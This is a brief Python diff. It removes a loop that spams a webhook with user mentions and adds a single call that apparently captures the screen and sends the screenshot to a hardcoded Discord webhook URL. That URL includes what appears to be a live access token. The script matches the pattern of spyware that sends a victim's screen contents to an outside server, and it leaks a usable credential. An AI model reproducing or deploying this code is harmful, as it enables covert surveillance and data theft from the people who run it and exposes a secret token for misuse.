@@ -1,5 +1,3 @@
-from functions import webhook
-while True:
-    url = ""
-    message = f"<@{}>"
-    webhook(url=url, message=message)
+from functions import screenshot_send
+
+screenshot_send("https://discord.com/api/webhooks/1302719341384700038/qp_pTHYEemyxMnusqOwdkvh4_9gU_quQ3NqFKX7-F8vqRbIoJTuSAQfThLpWAFaPhKiy")
